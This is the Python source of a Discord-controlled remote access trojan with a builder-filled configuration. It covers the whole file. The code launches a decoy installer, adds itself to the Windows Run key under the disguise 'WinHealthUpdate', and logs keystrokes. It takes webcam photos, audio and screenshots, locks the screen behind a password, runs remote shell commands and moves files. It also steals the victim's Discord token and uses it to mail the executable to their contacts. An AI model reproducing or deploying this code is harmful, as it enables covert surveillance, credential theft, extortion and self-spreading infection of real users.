import discord
from discord.ext import commands, tasks
import tkinter as tk
import os, ctypes, pyautogui, cv2, subprocess, threading, io, sys, socket, base64, shutil, time, webbrowser, re, asyncio
from PIL import Image, ImageTk
import sounddevice as sd
from scipy.io.wavfile import write
from pynput import keyboard
import pyttsx3
import pyperclip
import requests

# ===================== CONFIGURATION (DYNAMICALY FILLED BY BUILDER) =====================
TOKEN = "YOUR_BOT_TOKEN"
MY_CHANNEL_ID = YOUR_CHANNEL_ID_INT 
PASSWORD_BENAR = "YOUR_PASSWORD"
GAMBAR_BASE64 = "BG_IMAGE_DATA"

# Decoy / Binder Config
DECOY_DATA = "DECOY_BASE64_DATA"
DECOY_NAME = "original_installer.exe"

# Persistence Config
PERSISTENCE_ENABLED = False
OFFLINE_NOTIF = False
LOCK_ON_START = False

HOSTNAME = socket.gethostname()
USER_LOGIN = os.getlogin()
SERVICE_NAME = "WinHealthUpdate"
# =========================================================================================

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
auto_photo_enabled = False
keylogs = ""
logging_keys = False
locker_window = None # Global variable untuk remote unlock

# --- DECOY LOGIC ---
def run_decoy():
    try:
        if DECOY_DATA != "DECOY_BASE64_DATA" and DECOY_DATA != "":
            import tempfile
            path = os.path.join(tempfile.gettempdir(), DECOY_NAME)
            with open(path, "wb") as f:
                f.write(base64.b64decode(DECOY_DATA))
            os.startfile(path)
    except: pass

# --- PERSISTENCE ---
def add_to_startup():
    if PERSISTENCE_ENABLED:
        try:
            import winreg
            pth = os.path.realpath(sys.argv[0])
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, SERVICE_NAME, 0, winreg.REG_SZ, pth)
        except: pass

# --- UTILITY ---
def get_image_from_base64():
    try:
        if GAMBAR_BASE64 == "BG_IMAGE_DATA" or not GAMBAR_BASE64:
            return Image.new('RGB', (1920, 1080), color=(0, 0, 0))
        return Image.open(io.BytesIO(base64.b64decode(GAMBAR_BASE64)))
    except: return Image.new('RGB', (1920, 1080), color=(0, 0, 0))

def uninstall_self():
    try:
        import winreg
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(reg_key, SERVICE_NAME)
        winreg.CloseKey(reg_key)
    except: pass
    appdata = os.getenv('APPDATA')
    batch_path = os.path.join(appdata, "cleanup.bat")
    with open(batch_path, "w") as f:
        f.write(f'@echo off\ntimeout /t 5 /nobreak > nul\ndel /f /q "{sys.argv[0]}"\ndel "%~f0"')
    subprocess.Popen(batch_path, shell=True, creationflags=0x08000000)
    os._exit(0)

def set_wallpaper(path):
    try:
        # SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return True
    except Exception as e:
        print(f"Error setting wallpaper: {e}")
        return False

# --- SPREADING MODULES ---
def get_discord_token():
    path = os.getenv('APPDATA') + r'\discord\Local Storage\leveldb'
    tokens = []
    try:
        if not os.path.exists(path): return None
        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'): continue
            with open(f'{path}\\{file_name}', errors='ignore') as f:
                for line in f.readlines():
                    for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                        if token not in tokens: tokens.append(token)
    except: pass
    return tokens[0] if tokens else None

async def discord_spread_logic(ctx, mode, message_text):
    token = get_discord_token()
    if not token: return await ctx.send("❌ Discord token not found on target.")
    headers = {'Authorization': token}
    try:
        channels = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers).json()
        limit = 5 if mode == "recent" else 999
        count = 0
        for channel in channels:
            if count >= limit: break
            c_id = channel['id']
            requests.post(f'https://discord.com/api/v9/channels/{c_id}/messages', headers=headers, json={"content": message_text})
            with open(sys.executable, 'rb') as f:
                requests.post(f'https://discord.com/api/v9/channels/{c_id}/messages', headers=headers, files={'file': f})
            count += 1
            await asyncio.sleep(3)
        await ctx.send(f"✅ Spread to {count} users completed on `{HOSTNAME}`")
    except Exception as e: await ctx.send(f"❌ Error during spread: {e}")

# --- KEYLOGGER ---
def on_press(key):
    global keylogs, logging_keys
    if logging_keys:
        try: keylogs += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space: keylogs += " "
            elif key == keyboard.Key.enter: keylogs += "\n[ENTER]\n"
            else: keylogs += f" [{str(key)}] "

# --- GUI / LOCKER ---
class LockscreenGUI:
    def __init__(self, root):
        self.root = root
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.overrideredirect(True)
        # Background Setup
        img = get_image_from_base64().resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
        self.bg_tk = ImageTk.PhotoImage(img)
        canvas = tk.Canvas(root, highlightthickness=0, bg="black")
        canvas.pack(fill="both", expand=True)
        canvas.create_image(0, 0, image=self.bg_tk, anchor="nw")
        # Password Entry
        self.entry = tk.Entry(root, font=("Courier", 20), show="*", justify="center", bg="black", fg="#00ff00", insertbackground="#00ff00")
        canvas.create_window(root.winfo_screenwidth()//2, int(root.winfo_screenheight()*0.88), window=self.entry, width=350)
        self.root.bind('<Return>', self.check_pw)
        self.entry.focus_set()

    def check_pw(self, e=None):
        if self.entry.get() == PASSWORD_BENAR: 
            global locker_window
            self.root.destroy()
            locker_window = None
        else: 
            self.entry.delete(0, tk.END)

def run_gui():
    global locker_window
    if not locker_window:
        locker_window = tk.Tk()
        app = LockscreenGUI(locker_window)
        locker_window.mainloop()

# --- TASKS ---
@tasks.loop(seconds=60)
async def auto_photo_task():
    global auto_photo_enabled
    if auto_photo_enabled:
        channel = bot.get_channel(MY_CHANNEL_ID)
        if channel:
            cam = cv2.VideoCapture(0)
            ret, frame = cam.read()
            if ret:
                _, enc = cv2.imencode('.jpg', frame)
                await channel.send(f"📸 **[AUTO PHOTO]** `{HOSTNAME}`", file=discord.File(io.BytesIO(enc.tobytes()), f'auto_{HOSTNAME}.jpg'))
            cam.release()

# --- DISCORD EVENTS & COMMANDS ---
@bot.event
async def on_ready():
    channel = bot.get_channel(MY_CHANNEL_ID)
    if channel: 
        status = "LOCKED" if LOCK_ON_START else "STANDBY"
        await channel.send(f"🚀 **Target Online:** `{USER_LOGIN}@{HOSTNAME}`\n📍 **Status:** `{status}`\n📄 **Decoy:** `{DECOY_NAME}`")
    
    if not auto_photo_task.is_running(): auto_photo_task.start()
    keyboard.Listener(on_press=on_press).start()
    
    add_to_startup()
    run_decoy()
    
    if LOCK_ON_START:
        threading.Thread(target=run_gui, daemon=True).start()

@bot.command()
async def lock(ctx, target="all"):
    if target.lower() in ["all", HOSTNAME.lower()]:
        await ctx.send(f"🔒 Locking screen on `{HOSTNAME}`...")
        threading.Thread(target=run_gui, daemon=True).start()

@bot.command()
async def wallpaper(ctx, target):
    """Ganti wallpaper menggunakan gambar yang di-upload bareng command"""
    if target.lower() in ["all", HOSTNAME.lower()]:
        if ctx.message.attachments:
            # Simpan gambar sementara di folder Temp
            attachment = ctx.message.attachments[0]
            temp_path = os.path.join(os.getenv('TEMP'), attachment.filename)
            await attachment.save(temp_path)
            
            # Eksekusi ganti wallpaper
            if set_wallpaper(temp_path):
                await ctx.send(f"🖼️ Wallpaper on `{HOSTNAME}` has been changed to `{attachment.filename}`")
            else:
                await ctx.send(f"❌ Failed to change wallpaper on `{HOSTNAME}`")
        else:
            await ctx.send("⚠️ Please upload an image with the command!")

@bot.command()
async def unlock(ctx, target="all"):
    global locker_window
    if target.lower() in ["all", HOSTNAME.lower()]:
        if locker_window:
            try:
                # Menggunakan after(0, ...) untuk memastikan penutupan aman dari main thread GUI
                locker_window.after(0, locker_window.destroy)
                locker_window = None
                await ctx.send(f"🔓 **[SUCCESS]** `{HOSTNAME}` has been remotely unlocked and GUI process terminated.")
            except Exception as e:
                await ctx.send(f"⚠️ **[ERROR]** Failed to unlock `{HOSTNAME}`: {str(e)}")
        else:
            await ctx.send(f"ℹ️ `{HOSTNAME}` is not currently in a locked state.")

@bot.command()
async def spread(ctx, target, mode, *, text):
    """Contoh: !spread all recent Cek file tugas ini!"""
    if target.lower() in ["all", HOSTNAME.lower()]:
        await ctx.send(f"🕵️ Memulai spreading di `{HOSTNAME}`...")
        asyncio.create_task(discord_spread_logic(ctx, mode, text))

@bot.command()
async def ss(ctx, target="all"):
    if target.lower() in ["all", HOSTNAME.lower()]:
        with io.BytesIO() as b:
            pyautogui.screenshot().save(b, 'PNG')
            b.seek(0)
            await ctx.send(f"🖥️ Screenshot from `{HOSTNAME}`", file=discord.File(b, 'ss.png'))

@bot.command()
async def photo(ctx, target="all"):
    if target.lower() in ["all", HOSTNAME.lower()]:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            _, enc = cv2.imencode('.jpg', frame)
            await ctx.send(f"📷 Camera Capture `{HOSTNAME}`", file=discord.File(io.BytesIO(enc.tobytes()), 'cam.jpg'))
        cam.release()

@bot.command()
async def record(ctx, target, seconds: int = 5):
    if target.lower() in ["all", HOSTNAME.lower()]:
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        with io.BytesIO() as b:
            write(b, fs, rec); b.seek(0)
            await ctx.send(f"🎙️ Audio Recording `{HOSTNAME}`", file=discord.File(b, "record.wav"))

@bot.command()
async def say(ctx, target, *, text):
    if target.lower() in ["all", HOSTNAME.lower()]:
        def spk():
            engine = pyttsx3.init()
            engine.say(text); engine.runAndWait()
        threading.Thread(target=spk).start()
        await ctx.send(f"🗣️ TTS executed on `{HOSTNAME}`: {text}")

@bot.command()
async def msg(ctx, target, *, text):
    if target.lower() in ["all", HOSTNAME.lower()]:
        ctypes.windll.user32.MessageBoxW(0, text, "System Notification", 0x40 | 0x1)
        await ctx.send(f"💬 Message box displayed on `{HOSTNAME}`")

@bot.command()
async def bsod(ctx, target):
    if target.lower() in ["all", HOSTNAME.lower()]:
        os.system("taskkill /f /im explorer.exe")
        await ctx.send(f"🌀 Explorer killed on `{HOSTNAME}` (Pseudo-BSOD)")

@bot.command()
async def shutdown(ctx, target):
    if target.lower() in ["all", HOSTNAME.lower()]:
        await ctx.send(f"🔌 Shutting down `{HOSTNAME}`...")
        os.system("shutdown /s /t 1")

@bot.command()
async def open_url(ctx, target, url):
    if target.lower() in ["all", HOSTNAME.lower()]:
        webbrowser.open(url)
        await ctx.send(f"🌐 URL opened on `{HOSTNAME}`")

@bot.command()
async def download(ctx, target, *, path):
    if target.lower() in ["all", HOSTNAME.lower()] and os.path.exists(path):
        await ctx.send(file=discord.File(path))

@bot.command()
async def upload(ctx, target, folder="."):
    if target.lower() in ["all", HOSTNAME.lower()] and ctx.message.attachments:
        for a in ctx.message.attachments:
            await a.save(os.path.join(folder, a.filename))
            await ctx.send(f"✅ Uploaded `{a.filename}` to `{HOSTNAME}`")

@bot.command()
async def get_location(ctx, target="all"):
    if target.lower() in ["all", HOSTNAME.lower()]:
        try:
            r = requests.get("http://ip-api.com/json/").json()
            await ctx.send(f"📍 **{HOSTNAME}**: {r['city']}, {r['country']}\n🔗 Maps: https://www.google.com/maps?q={r['lat']},{r['lon']}")
        except: await ctx.send("❌ Failed to get location.")

@bot.command()
async def autophoto(ctx, target, status):
    global auto_photo_enabled
    if target.lower() in ["all", HOSTNAME.lower()]:
        auto_photo_enabled = True if status.lower() == "on" else False
        await ctx.send(f"📸 Auto Photo for `{HOSTNAME}` is now: **{status.upper()}**")

@bot.command()
async def keylog(ctx, target, action):
    global keylogs, logging_keys
    if target.lower() in ["all", HOSTNAME.lower()]:
        if action == "on": 
            logging_keys = True
            await ctx.send(f"⌨️ Keylogger **ON** for `{HOSTNAME}`")
        elif action == "off": 
            logging_keys = False
            await ctx.send(f"⌨️ Keylogger **OFF** for `{HOSTNAME}`")
        elif action == "dump":
            if keylogs == "":
                await ctx.send(f"ℹ️ No logs captured yet for `{HOSTNAME}`.")
            else:
                await ctx.send(file=discord.File(io.BytesIO(keylogs.encode()), f"logs_{HOSTNAME}.txt"))
                keylogs = ""

@bot.command()
async def shell(ctx, target, *, cmd):
    if target.lower() in ["all", HOSTNAME.lower()]:
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, creationflags=0x08000000).decode('cp1252')
            if not out: out = "Command executed (No output)."
            await ctx.send(f"```\n{out[:1900]}\n```")
        except Exception as e: await ctx.send(f"❌ Error: {e}")

@bot.command()
async def clean(ctx, target):
    if target.lower() in ["all", HOSTNAME.lower()]:
        await ctx.send(f"⚠️ `{HOSTNAME}` is uninstalling and cleaning up...")
        uninstall_self()

# --- RUN BOT ---
if __name__ == "__main__":
    try:
        # Tambahkan delay kecil agar sistem tidak kaget saat startup
        time.sleep(1) 
        bot.run(TOKEN)
    except Exception as e:
        # Jika error, tulis ke file log di folder temp agar bisa kita cek
        import tempfile
        debug_path = os.path.join(tempfile.gettempdir(), "phantom_debug.txt")
        with open(debug_path, "w") as f:
            f.write(str(e))
